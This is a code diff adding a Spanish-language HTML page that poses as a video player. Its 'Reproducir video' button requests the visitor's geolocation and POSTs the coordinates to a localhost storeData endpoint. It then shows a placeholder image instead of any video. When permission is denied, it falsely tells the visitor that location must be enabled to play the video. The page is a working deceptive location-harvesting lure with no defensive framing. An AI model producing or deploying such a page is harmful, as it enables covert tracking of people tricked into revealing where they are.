@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reproducir video</title>
+</head>
+
+<body>
+    <button onclick="playVideo()">Reproducir video</button>
+    <img id="img" style="display: none;" src="loading.gif" alt="Loading..."> <!-- Placeholder loading image -->
+
+    <script>
+
+        function playVideo() {
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(saveLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function saveLocation(position) {
+
+
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            // Create a Blob with latitude and longitude data
+
+            fetch('http://localhost:3000/storeData', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude
+                }),
+                cors: "no-cors"
+            })
+                .then(response => {
+                    if (response) {
+                        return response;
+                    }
+                    throw new Error('Network response was not ok.');
+                })
+                .then(data => {
+                    console.log('Location data saved:', data);
+                    // Display the image after getting the location data
+                    var img = document.getElementById('img');
+                    img.src = 'xxx.jpg'; // Change 'example.jpg' to the path of your image file
+                    img.style.display = 'block';
+                })
+                .catch(error => {
+                    console.error('Error saving location data:', error);
+                });
+        }
+
+        function showError(error) {
+            alert("La localización del dipositivo debe ser activada para reproducir el video.");
+        }
+    </script>
+</body>
+
+</html>
